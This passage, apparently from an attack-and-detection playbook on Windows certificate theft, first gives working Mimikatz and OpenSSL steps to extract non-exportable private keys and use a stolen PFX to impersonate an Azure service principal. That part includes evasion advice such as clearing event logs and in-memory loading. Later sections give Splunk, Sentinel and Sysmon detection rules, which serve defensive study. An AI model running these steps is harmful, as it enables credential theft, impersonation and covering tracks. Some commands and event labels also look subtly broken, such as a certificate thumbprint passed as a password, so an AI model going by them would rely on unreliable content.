    3. Check firewall rules: `Get-NetFirewallRule -DisplayName "*8443*"`

**References:**
- [PowerShell HttpWebRequest Class](https://learn.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest)

---

#### Step 4: Import Certificate on Attacker Infrastructure

**Objective:** Import the stolen .pfx certificate into attacker's system to use its private key for authentication impersonation.

**Command (Linux/OpenSSL - Extract Private Key):**
```bash
# Extract private key from PFX
openssl pkcs12 -in extracted_cert.pfx -passin pass:"P@ssw0rd123!" -nocerts -out private_key.pem

# Extract public certificate
openssl pkcs12 -in extracted_cert.pfx -passin pass:"P@ssw0rd123!" -nokeys -out public_cert.pem

# Verify key/cert pair matches
openssl pkey -in private_key.pem -pubout > private_key_pub.pem
openssl x509 -in public_cert.pem -pubkey -noout > cert_pub.pem
diff private_key_pub.pem cert_pub.pem  # Should be identical
```

**Command (Windows - Import for Authentication):**
```powershell
# Import into Windows certificate store for use
$PfxPath = "extracted_cert.pfx"
$Password = ConvertTo-SecureString -String "P@ssw0rd123!" -AsPlainText -Force

# Import into LocalMachine Personal store
Import-PfxCertificate -FilePath $PfxPath -CertStoreLocation Cert:\LocalMachine\My -Password $Password -Exportable

# Verify import
Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -match "dc01.contoso.com"}
```

**Command (Use for Azure Authentication - Token Generation):**
```powershell
# Use stolen certificate to authenticate to Azure as the service principal
$Cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Thumbprint -eq "ABC123DEF456..."}
$ClientId = "{application-id}"  # Service principal app ID
$TenantId = "contoso.onmicrosoft.com"

# Connect with certificate
Connect-AzAccount -ServicePrincipal -Credential (New-Object System.Management.Automation.PSCredential(
    $ClientId,
    (ConvertTo-SecureString -String "cert:$($Cert.Thumbprint)" -AsPlainText -Force)
)) -TenantId $TenantId

# Now impersonate the service principal with full access
Get-AzSubscription
```

**Expected Output (Linux):**
```
MAC verified OK
PKCS7 Encrypted data: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2048
PKCS7 Data
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1+V5BzwA6VpXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
-----END RSA PRIVATE KEY-----
```

**Expected Output (Windows Import):**
```
PSComputerName    : localhost
Subject           : CN=dc01.contoso.com
Thumbprint        : ABC123DEF456ABC123DEF456ABC123
FriendlyName      : 
NotBefore         : 1/1/2023 12:00:00 AM
NotAfter          : 1/1/2025 12:00:00 AM
```

**What This Means:**
- **MAC verified OK**: PFX file integrity confirmed
- **Private key extracted**: Can now be used for signing/encryption
- **Certificate imported**: Ready for Azure/Office 365 authentication
- **Impersonation ready**: Can now authenticate as the service principal

**Post-Exploitation Impact:**
- **Azure/M365**: Can access all resources the service principal has permissions to
- **On-Premises**: Can forge Kerberos tickets using ADFS certificate
- **Persistence**: Stolen certificate valid until expiration (months/years)

**Version Note:** Works across all Windows versions and cloud platforms.

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM on attacker system (no events); HIGH if monitoring Azure API authentication attempts
- **Evasion**:
  1. Use certificate for single high-value action (avoid repeated logins)
  2. Use from legitimate IP addresses (VPN, proxy)
  3. Randomize timing of authentication attempts
  4. Monitor Azure Sign-In Logs for anomalies and stop if detected

**Troubleshooting:**
- **Error:** "Cannot verify certificate chain"
  - **Cause**: Root CA certificate not in trusted store
  - **Fix (Linux)**: `openssl verify -CAfile root_ca.pem cert.pem`
  - **Fix (Windows)**: Import root CA first: `Import-PfxCertificate -FilePath root_ca.cer -CertStoreLocation Cert:\LocalMachine\Root`

- **Error:** "Authentication failed with certificate"
  - **Cause**: Thumbprint mismatch or certificate expired
  - **Fix (All)**: 
    1. Verify expiration: `openssl x509 -in cert.pem -noout -dates`
    2. Get correct thumbprint: `Get-ChildItem Cert:\LocalMachine\My | Format-Table Thumbprint, Subject`
    3. Retry with correct thumbprint

**References:**
- [OpenSSL PKCS12 Manual](https://www.openssl.org/docs/man1.1.1/man1/openssl-pkcs12.html)
- [Azure Service Principal Authentication via Certificate](https://learn.microsoft.com/en-us/azure/active-directory/develop/howto-create-service-principal-portal)

---

### METHOD 3: Non-Exportable Private Key Extraction via Mimikatz (CryptoAPI Key Dump)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025 (all versions; TPM-protected keys require additional techniques)

**Prerequisites:** Local Admin or SYSTEM privilege; target certificate must be in LocalMachine store

**Difficulty:** High (requires deep kernel knowledge or specialized tools)

---

#### Step 1: Enumerate Non-Exportable Certificates

**Objective:** Identify certificates marked "non-exportable" which require special techniques to extract (these are typically high-security targets like domain controllers, ADFS servers).

**Command (All Versions):**
```powershell
# Find non-exportable certificates
$NonExportableCerts = Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Where-Object {
    ($_.PrivateKey -ne $null) -and 
    ($_.PrivateKey.CspKeyContainerInfo.Exportable -eq $false)
}

$NonExportableCerts | Select-Object Subject, Thumbprint, @{
    Name="KeyContainer";
    Expression={$_.PrivateKey.CspKeyContainerInfo.KeyContainerName}
} | Format-Table

# Get more details
foreach ($Cert in $NonExportableCerts) {
    Write-Host "Subject: $($Cert.Subject)"
    Write-Host "Key Container: $($Cert.PrivateKey.CspKeyContainerInfo.KeyContainerName)"
    Write-Host "Exportable: $($Cert.PrivateKey.CspKeyContainerInfo.Exportable)"
    Write-Host "Machine Keyset: $($Cert.PrivateKey.CspKeyContainerInfo.MachineKeySet)"
    Write-Host "---"
}
```

**Expected Output:**
```
Subject                              Thumbprint                         KeyContainer
-------                              ----------                         -----------
CN=dc01.contoso.com                  ABC123DEF456ABC123DEF456ABC123     {ABC-DEF-GHI-JKL}
CN=Microsoft Exchange Server Auth    XYZ789ABC123XYZ789ABC123XYZ789     {XYZ-789-ABC-123}

Subject: CN=dc01.contoso.com
Key Container: {ABC-DEF-GHI-JKL}
Exportable: False
Machine Keyset: True
```

**What This Means:**
- **Exportable: False**: Standard PowerShell export will fail; need Mimikatz
- **Machine Keyset: True**: Key stored in HKLM (machine store); more valuable than user store
- **Key Container**: Unique identifier for the private key in CNG/CSP storage

**Red Flags (High-Value Targets):**
- Machine Keyset: True (system-level keys)
- Subject contains "DC", "ADFS", "Exchange", "SQL"
- Non-exportable: These are intentionally protected

**Version Note:** Command identical across all versions.

---

#### Step 2: Use Mimikatz to Extract Non-Exportable Key

**Objective:** Use Mimikatz's CryptoAPI hooking or kernel-level access to extract the private key bytes from memory/kernel, even though marked non-exportable.

**Command (Mimikatz - crypto::certificates):**
```
mimikatz # privilege::debug
mimikatz # crypto::certificates /systemstore:local_machine /store:my /export
```

**Expected Output:**
```
 0. CN=dc01.contoso.com
    Key Container  : {ABC-DEF-GHI-JKL}
    Provider Name  : Microsoft RSA SChannel Cryptographic Provider v1.0
    Provider Type  : 1
    Type           : AT_SIGNATURE (2)
    Exportable key : No
    Key size       : 2048

[*] Private Key exported to: dc01_ABC123DEF456.pvk
```

**What This Means:**
- **Private Key exported to .pvk file**: Mimikatz successfully extracted non-exportable key
- **File created**: .pvk contains the raw private key bytes (can be imported anywhere)
- **Key size: 2048**: RSA-2048 key (standard for certificates)

**Command (Mimikatz - dpapi::capi):**
```
mimikatz # dpapi::capi
```

**Expected Output:**
```
DPAPI CryptoAPI Information:
[+] DCAPI Provider Name: Microsoft RSA SChannel Cryptographic Provider v1.0
[+] Master Key: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
[+] Decrypted Private Key: [hex blob]
```

**Version-Specific Notes:**

**Server 2016-2019:**
```
Command works directly; keys always in plaintext/weak DPAPI encryption
```

**Server 2022-2025 (Without TPM):**
```
Same command works; keys in registry or unencrypted CSP storage
Risk: TPM might be configured; test with "tpm.msc"
```

**Server 2022-2025 (With TPM Enforced):**
```
Command may fail for TPM-protected keys with error: "TPM access denied"
Workaround: Use alternative technique (METHOD 4: WinRM Session Key Extraction)
```

**OpSec & Evasion:**
- **Detection Risk**: CRITICAL - Requires SYSTEM privilege (Event ID 4688 logged); CryptoAPI access may be EDR-monitored
- **Evasion**:
  1. Run Mimikatz via reflective DLL injection (avoid disk creation)
  2. Load in-memory using PowerShell
  3. Immediately exfiltrate key after extraction
  4. Clear PowerShell history and event logs

**Troubleshooting:**
- **Error:** "crypto::certificates not recognized"
  - **Cause**: Older Mimikatz version (< 2.1)
  - **Fix (All)**: Download latest: `git clone https://github.com/gentilkiwi/mimikatz`

- **Error:** "Access Denied"
  - **Cause**: Not running as SYSTEM
  - **Fix (All)**: 
    1. Verify: `whoami` should return "nt authority\system"
    2. Run PsExec: `psexec.exe -s cmd.exe`
    3. Then re-run Mimikatz

- **Error:** "Key not found"
  - **Cause**: Certificate is in CurrentUser store, not LocalMachine
  - **Fix (All)**: Try `/systemstore:current_user` instead

**References:**
- [Mimikatz crypto Module Docs](https://docs.specterops.io/ghostpack-docs/SharpDPAPI-mdx/commands/crypto)
- [Non-Exportable Certificate Extraction](https://krestfield.github.io/docs/pki/exporting_a_nonexportable_certificate.html)

---

#### Step 3: Convert .PVK to Standard Formats (PEM/DER) for Portability

**Objective:** Convert Mimikatz-extracted .pvk file to industry-standard PEM or DER format for use on non-Windows systems.

**Command (Linux/OpenSSL - PVK to PEM):**
```bash
# Install OpenSSL (if needed)
apt-get install openssl

# Convert PVK to DER (binary format)
openssl rsa -inform PVK -in dc01_ABC123DEF456.pvk -outform DER -out dc01_private.der

# Convert DER to PEM (ASCII, portable)
openssl rsa -inform DER -in dc01_private.der -outform PEM -out dc01_private.pem

# Verify key is valid
openssl rsa -in dc01_private.pem -check -noout
```

**Command (Windows - Use PVK as-is for Windows targets, or convert on Linux):**
```powershell
# If on Windows, copy .pvk file and use with signtool or custom code
# For maximum portability, convert on Linux first

# Verify PVK file is readable
[System.IO.File]::ReadAllBytes("dc01_ABC123DEF456.pvk") | Select-Object -First 16
```

**Expected Output (Linux Conversion):**
```
RSA Private Key Encryption Test successful
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1+V5BzwA6VpXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
-----END RSA PRIVATE KEY-----
```

**Expected Output (Verification):**
```
RSA key ok
[1] RSA key test number 1
Key ok
```

**What This Means:**
- **Key ok**: Private key is valid and can be used cryptographically
- **PEM format**: Portable text format (usable on Linux, macOS, cloud platforms)
- **DER format**: Binary format (compact, faster to process)

**Version Note:** Conversion identical across all Windows/Linux versions.

**Post-Conversion Uses:**
- **TLS/SSL Servers**: Use for HTTPS authentication (impersonate DC)
- **Azure Services**: Use for service principal authentication
- **Kerberos**: Use for golden ticket signing (if ADFS key)
- **Email**: Use for S/MIME signing (if Exchange key)

**OpSec & Evasion:**
- **Detection Risk**: LOW on attacker infrastructure (conversion is local)
- **Evasion**: None needed; this is post-exploitation on attacker system

**Troubleshooting:**
- **Error:** "unable to load Private Key"
  - **Cause**: .pvk file corrupted or wrong format
  - **Fix (Linux)**: 
    1. Verify file type: `file dc01_ABC123DEF456.pvk`
    2. Check file size (should be 500+ bytes): `ls -lh dc01_ABC123DEF456.pvk`
    3. Re-extract from target with Mimikatz

- **Error:** "PVK format not recognized"
  - **Cause**: Mimikatz version output format changed
  - **Fix (All)**: Use Mimikatz flag `/export:openssl` instead

**References:**
- [OpenSSL RSA Manual](https://www.openssl.org/docs/man1.1.1/man1/openssl-rsa.html)
- [PVK vs PEM Formats Comparison](https://www.ssl.com/article/pvk-vs-pem-formats/)

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Test: T1552.004

- **Atomic Test ID**: `c932e4cf-2fbc-4fac-9b3f-46def5852b5d`
- **Test Name**: "Dump domain backup DPAPI keys with Mimikatz"
- **Description**: Uses Mimikatz to dump DPAPI domain backup keys from a domain controller, extracting encryption material that can decrypt all user-level DPAPI secrets in the domain
- **Supported Versions**: Server 2016, 2019, 2022, 2025; Windows 10, 11
- **Requires**: Domain Admin or SYSTEM privilege; Network access to DC (SMB 445)

**Execution Command (PowerShell):**
```powershell
Invoke-AtomicTest T1552.004 -TestNumbers 1
```

**Manual Execution (If Atomic Framework Not Available):**
```cmd
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC01 /export" exit
```

**Cleanup Command:**
```powershell
Remove-Item -Path "backup_key_*.pvk" -Force
Invoke-AtomicTest T1552.004 -TestNumbers 1 -Cleanup
```

**Expected Output (Successful Test):**
```
[+] Backup key successfully exported to backup_key_{GUID}.pvk
[+] Test completed successfully
```

**Detection During Test:**
- **Event ID 4662**: SecretObject access attempt (if auditing enabled)
- **Mimikatz.exe Process**: Event ID 4688 process creation
- **File Creation**: Sysmon Event ID 11 for .pvk file write

**Reference:**
[Atomic Red Team T1552.004 GitHub](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md)

---

## 7. SPLUNK DETECTION RULES

### Rule 1: DPAPI Backup Key Extraction via Mimikatz

**Rule Configuration:**
- **Required Index**: `main` or custom Windows event index
- **Required Sourcetype**: `WinEventLog:Security`
- **Required Fields**: EventID, ObjectType, AccessMask, ObjectName, SubjectUserName
- **Alert Threshold**: >= 1 event in 5 minutes (this is rare activity)
- **Applies To Versions**: Windows Server 2016+

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventID=4662 ObjectType="SecretObject" 
AccessMask="0x2" ObjectName="*BCKUPKEY*"
| stats count by SubjectUserName, Computer, ObjectName
| where count >= 1
```

**What This Detects:**
- **EventID=4662**: Object access event (specifically SecretObject)
- **ObjectType="SecretObject"**: Target is a secret/credential object
- **AccessMask="0x2"**: Read-only access (typical for key extraction)
- **ObjectName="*BCKUPKEY*"**: Matches DPAPI backup key registry object
- **Alert Trigger**: Any occurrence of this pattern (very low false positive rate)

**Manual Configuration Steps (Splunk Web UI):**
1. Log into Splunk Web → **Search & Reporting** (left menu)
2. Click **New Alert** (top-right)
3. Paste the SPL query above into the search box
4. Run the search and verify results
5. Click **Save As** → **Alert**
6. Set **Alert Name** to "DPAPI Backup Key Extraction"
7. Set **Trigger Condition** to **Per Result** (any matching event)
8. Under **Alert Actions**:
   - Enable **Send Email**: your-soc@company.com
   - Enable **Create Event**: Incident response team
   - Enable **Add to Incident Review**: Critical severity
9. Click **Save Alert**

**False Positive Analysis:**
- **Legitimate Activity**: None (DPAPI backup key access is administrative only; should never occur in normal operations)
- **Benign Tools**: None (this is a direct indicator of malicious DPAPI extraction)
- **Tuning**: 
  - Exclude known authorized security tools: `NOT SubjectUserName="svc_splunk"` (if using Splunk for vulnerability scans)
  - Time-based: Alert only during work hours if your org doesn't do security scans at night: `_time > "09:00" AND _time < "18:00"`

**Advanced Variants:**
```spl
# Variant 1: Catch secondary lookups after extraction (multiple object accesses)
sourcetype=WinEventLog:Security EventID=4662 ObjectType="SecretObject" 
AccessMask IN ("0x2", "0x1") 
| stats count by SubjectUserName
| where count > 3

# Variant 2: Correlate with Mimikatz process execution
(sourcetype=WinEventLog:Security EventID=4688 CommandLine="*mimikatz*")
OR (sourcetype=WinEventLog:Security EventID=4662 ObjectName="*BCKUPKEY*")
| transaction SubjectUserName startswith="CommandLine"
```

**Source:** [Splunk Research - Windows Certificate Services](https://research.splunk.com/stories/windows_certificate_services/)

---

### Rule 2: Certificate Export from LocalMachine Store

**Rule Configuration:**
- **Required Index**: `main` or Windows event index
- **Required Sourcetype**: `WinEventLog:Security`
- **Required Fields**: EventID, ProcessName, CommandLine, SubjectUserName
- **Alert Threshold**: >= 1 event if using certutil.exe
- **Applies To Versions**: Windows Server 2016+

**SPL Query:**
```spl
sourcetype=WinEventLog:Security (EventID=4688 AND ProcessName="*certutil.exe") 
CommandLine IN ("*exportPFX*", "*export*", "*-exportPFX*")
| stats count by SubjectUserName, Computer, CommandLine
```

**What This Detects:**
- **EventID=4688**: Process creation
- **ProcessName="*certutil.exe"**: Windows certificate utility
- **CommandLine="*exportPFX*"**: Certificate export command
- **Alert Trigger**: Process created with export flag

**Manual Configuration Steps:**
1. **Splunk Web** → **Search & Reporting**
2. Click **New Alert**
3. Paste query above
4. Click **Save As** → **Alert**
5. Name: "CertUtil Certificate Export Detected"
6. Trigger: **Per Result**
7. Add to alert actions:
   - Email to SOC
   - Auto-incident creation
   - Severity: **High** (certificate theft = high-value)
8. **Save Alert**

**False Positive Analysis:**
- **Legitimate Activity**: 
  - Legitimate system administrators exporting certificates for renewal
  - Scheduled certificate backup/export tasks
- **Tuning Exclusions**:
  ```spl
  NOT SubjectUserName IN ("svc_backup_system", "svc_cert_manager")
  NOT Computer IN ("backup-server", "cert-server")
  ```

**Source:** [GitHub Splunk Security Content - CertUtil Detection](https://github.com/splunk/security_content/blob/develop/detections/endpoint/certutil_exe_certificate_extraction.yml)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: DPAPI Backup Key Access via AuditLogs

**Rule Configuration:**
- **Required Table**: `AuditLogs`
- **Required Fields**: OperationName, InitiatedBy, TargetResources, ActivityDateTime
- **Alert Severity**: **Critical**
- **Frequency**: Run every 5 minutes
- **Lookback**: Last 24 hours (to catch any manual sync/replication)
- **Applies To Versions**: Azure AD/Entra ID (all versions)

**KQL Query:**
```kusto
AuditLogs
| where OperationName has "DPAPI" or OperationName has "BackupKey"
| where ActivityResult =~ "Success"
| project InitiatedBy, TargetResources, OperationName, ActivityDateTime, Result
| extend UPN = tostring(InitiatedBy.user.userPrincipalName)
| summarize Count=count() by UPN, OperationName, ActivityDateTime
| where Count >= 1
```

**What This Detects:**
- **OperationName has "DPAPI"**: Operations involving DPAPI functions
- **OperationName has "BackupKey"**: Backup key extraction attempts
- **ActivityResult = "Success"**: Only successful operations (attempt to extract actual key)
- **Alert Trigger**: Any successful DPAPI backup key operation

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** (search bar)
2. Select your workspace → Left menu → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - **Name**: `DPAPI Backup Key Extraction Attempt`
   - **Description**: Detects unauthorized attempts to extract DPAPI backup keys from Entra ID
   - **Tactics**: Credential Access
   - **Techniques**: T1552.004
   - **Severity**: Critical
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - **Run query every**: 5 minutes
   - **Lookup data from the last**: 24 hours
   - **Suppress queries**: ON (to avoid alert spam within same incident window)
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
   - **Grouping**:
     - Group alerts into single incident if: **Same entity type AND Same alert severity**
     - Grouping period: **5 hours**
7. **Automated response Tab** (optional):
   - Click **+ Add action**
   - Select playbook: "Quarantine User Account" (if available in your workspace)
8. Click **Review + Create** → **Create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the alert rule
$AlertRule = @{
    ResourceGroupName = $ResourceGroup
    WorkspaceName = $WorkspaceName
    DisplayName = "DPAPI Backup Key Extraction Attempt"
    Query = @'
AuditLogs
| where OperationName has "DPAPI" or OperationName has "BackupKey"
| where ActivityResult =~ "Success"
| project InitiatedBy, TargetResources, OperationName, ActivityDateTime, Result
| extend UPN = tostring(InitiatedBy.user.userPrincipalName)
| summarize Count=count() by UPN, OperationName, ActivityDateTime
| where Count >= 1
'@
    Severity = "Critical"
    Enabled = $true
    Frequency = 5  # minutes
    Period = 1440  # minutes (24 hours)
}

New-AzSentinelScheduledAlertRule @AlertRule
```

**Source:** [Microsoft Sentinel AuditLogs Schema](https://learn.microsoft.com/en-us/azure/sentinel/data-connectors-reference)

---

### Query 2: Certificate-Based Authentication with Suspicious Keys

**Rule Configuration:**
- **Required Table**: `SigninLogs`, `AADServicePrincipalSignInLogs`
- **Required Fields**: AppId, ClientId, AuthenticationMethodDetail, Status
- **Alert Severity**: **High**
- **Frequency**: Real-time (10 minutes)
- **Applies To Versions**: Entra ID (all versions)

**KQL Query:**
```kusto
AADServicePrincipalSignInLogs
| where AuthenticationMethodDetail =~ "Certificate"
| where Status == "Success"
| extend CertDetails = parse_json(tostring(AuthenticationDetails))
| where timestamp > ago(24h)
| summarize SignInCount=count(), FirstSeen=min(timestamp), LastSeen=max(timestamp) by AppId, ClientId, ServicePrincipalId
| where SignInCount > 10  # Threshold for abnormal activity
```

**What This Detects:**
- **AuthenticationMethodDetail = "Certificate"**: Certificate-based authentication (vs password/MFA)
- **Status = "Success"**: Successful authentication (not just attempts)
- **SignInCount > 10**: Multiple logins in 24h (abnormal pattern)
- **Alert Trigger**: Service principal using certificate with sudden spike in activity

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - **Name**: `Suspicious Service Principal Certificate Authentication`
   - **Severity**: High
   - **Tactics**: Defense Evasion, Credential Access
4. **Set rule logic Tab:**
   - Paste query above
   - **Run query every**: 10 minutes
   - **Lookup data from the last**: 1 day
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping by: Same service principal
6. Click **Review + Create**

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID 4662: Directory Service Access (SecretObject)

**Log Source**: Security event log
**Event Name**: Directory Service Access
**Trigger**: Access to DPAPI backup key or other sensitive LDAP objects
**Filter**: ObjectType='SecretObject' AND AccessMask=0x2
**Applies To Versions**: Windows Server 2016+

**Manual Configuration Steps (Group Policy - Domain Level):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to:
   - **Forest** → **Domains** → **YourDomain** → **Domain Controllers** → **Default Domain Controllers Policy**
3. Right-click → **Edit**
4. Navigate to:
   - **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
5. Double-click **Audit Directory Service Access**
6. Enable:
   - ☑ Configure the following audit events
   - ☑ Success
   - ☑ Failure
7. Click **OK**
8. Close Group Policy Editor
9. Run `gpupdate /force` on all domain controllers

**Manual Configuration Steps (Server 2022+ - via PowerShell):**
```powershell
# Enable DSACL auditing on domain controller
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Directory Service Access"
```

**Manual Configuration Steps (Local Policy on Single Server):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to:
   - **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Double-click **Audit Directory Service Access**
4. Enable Success and Failure
5. Click **OK**
6. Restart the machine or run:
   ```cmd
   auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
   ```

**Event Details to Monitor:**
- **Event ID**: 4662
- **ObjectType**: SecretObject (DPAPI backup key)
- **ObjectName**: BCKUPKEY value in registry path
- **AccessMask**: 0x2 (read access)
- **SubjectUserName**: Initiating user (should be local admin only)

**Expected Log Entry (Normal Activity - Backup):**
```
Event ID:        4662
Task Category:   Directory Service Access
Keywords:        Audit Success
Subject:
  Security ID:         DOMAIN\BACKUP_SYSTEM
  Account Name:        BACKUP_SYSTEM
  Account Domain:      DOMAIN
  Logon ID:            0xABCDEF

Object:
  Object Type:        SecretObject
  Object Name:        BCKUPKEY
  Object GUID:        {GUID}
  Access Mask:        0x2
```

**Expected Log Entry (Malicious Activity - Extraction):**
```
Event ID:        4662
Task Category:   Directory Service Access
Keywords:        Audit Success
Subject:
  Security ID:         DOMAIN\ATTACKER_ADMIN
  Account Name:        ATTACKER_ADMIN
  Account Domain:      DOMAIN
  Logon ID:            0xDEADBEEF

Object:
  Object Type:        SecretObject
  Object Name:        BCKUPKEY
  Object GUID:        {GUID}
  Access Mask:        0x2
```

**Detection Criteria (Alert on Occurrence):**
- Any access to BCKUPKEY outside of scheduled backup windows
- Access from non-domain controller systems
- Access outside business hours
- Repeat access attempts (multiple accesses in short timeframe)

---

### Event ID 4913: Advanced Audit Policy Change

**Log Source**: Security event log
**Event Name**: Central Access Policy Staging Enabled / Disabled
**Trigger**: Certificate properties modified, including export restrictions
**Applies To Versions**: Windows Server 2016+

**Manual Configuration Steps:**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to:
   - **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **System**
3. Double-click **Audit Audit Policy Change**
4. Enable Success and Failure
5. Click **OK**

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version**: 13.0+
**Supported Platforms**: Windows Server 2016-2025, Windows 10/11

```xml
<!-- Detect file creation of certificate/key files -->
<Sysmon schemaversion="4.4">
  <EventFiltering>
    <!-- Event ID 11: File Created -->
    <RuleGroup name="" groupRelation="or">
      <FileCreate onmatch="include">
        <!-- Detect .pvk (private key) file creation -->
        <TargetFilename condition="contains">.pvk</TargetFilename>
        <TargetFilename condition="contains">.pfx</TargetFilename>
        <TargetFilename condition="contains">.p12</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- Event ID 3: Network Connection -->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="include">
        <!-- Detect exfiltration of keys over HTTPS -->
        <DestinationPort condition="is">443</DestinationPort>
        <Image condition="contains">mimikatz</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- Event ID 1: Process Creation -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="include">
        <!-- Detect Mimikatz or SharpDPAPI execution -->
        <Image condition="contains">mimikatz</Image>
        <Image condition="contains">SharpDPAPI</Image>
        <Image condition="contains">certutil</Image>
        <CommandLine condition="contains">exportPFX</CommandLine>
        <CommandLine condition="contains">lsadump::backupkeys</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```
5. Forward Sysmon logs to SIEM (Splunk, Sentinel, etc.)

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: "Suspicious Certificate Export Activity Detected"

**Alert Name**: "Sensitive credential retrieval via certificate APIs"
**Severity**: High
**Description**: Alert triggered when CryptoAPI functions (CryptExportKey, CryptUnprotectData) are called in unusual contexts, suggesting private key extraction
**Applies To**: All subscriptions with Defender for Servers enabled

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Left menu → **Environment settings**
3. Select your **Subscription**
4. Scroll down → **Defender plans**
5. Enable the following:
   - **Defender for Servers**: ON
   - **Defender for Databases**: ON
   - **Defender for Identity**: ON (for DPAPI detection)
   - **Defender for Cloud Apps**: ON (for certificate activity)
6. Click **Save**
7. Wait 15-30 minutes for data collection to begin

**Alert Configuration:**
1. Navigate to **Microsoft Defender for Cloud** → **Security alerts**
2. Filter by "Certificate" or "Credential"
3. Click on the alert → **Manage** → **Create automation response**
4. Configure auto-remediation:
   - Disable user account (if confirmed malicious)
   - Isolate virtual machine (if confirmed compromise)
   - Create incident for SOC review

**Expected Alert Output:**
```
Alert Type:    Suspicious Certificate Export Activity
Severity:      High
Resource:      Virtual Machine - DC01
Description:   System detected CryptExportKey API call from process mimikatz.exe
Time Detected: 2026-01-06 10:15:22 UTC
```

**Reference:** [Microsoft Defender for Cloud Alerts Reference](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Certificate Modification & Export Activity

```powershell
# Connect to Compliance Center (requires admin)
Connect-ExchangeOnline

# Search for certificate-related operations
Search-UnifiedAuditLog -Operations "AddServicePrincipalCredentials", "UpdateServicePrincipal" -StartDate (Get-Date).AddDays(-7)

# Search for certificate export operations
Search-UnifiedAuditLog -FreeText "certificate" -FreeText "export" -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "C:\Audit\cert_activity.csv"

# Analyze results
$AuditLogs = Search-UnifiedAuditLog -Operations "AddServicePrincipalCredentials" -StartDate (Get-Date).AddDays(-7)
foreach ($Log in $AuditLogs) {
    $Details = ($Log.AuditData | ConvertFrom-Json)
    Write-Host "User: $($Details.UserId)"
    Write-Host "Operation: $($Details.Operation)"
    Write-Host "Service Principal: $($Details.ObjectId)"
    Write-Host "---"
}
```

**Operation Names to Monitor**:
- **AddServicePrincipalCredentials**: New certificate added to service principal
- **UpdateServicePrincipal**: Service principal credential updated
- **RemoveServicePrincipalCredentials**: Certificate removed (potential cleanup after theft)

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Left menu → **Audit** → **Audit search**
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for data availability

**Manual Configuration Steps (Search & Export):**
1. Go to **Audit** → **Search** (left menu)
2. Set **Date range**:
   - Start date: 7 days ago
   - End date: Today
3. Under **Activities**, select:
   - "AddServicePrincipalCredentials"
   - "UpdateServicePrincipal"
4. Under **Users**, leave blank (or enter specific admin)
5. Click **Search**
6. Results appear below; click **Export** → **Download all results**

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Enforce TPM 2.0 for Device Key Protection (Server 2022+)

**Objective**: Prevent extraction of Entra ID device keys by enforcing Trusted Platform Module (TPM) storage, making keys non-exportable from memory or registry.

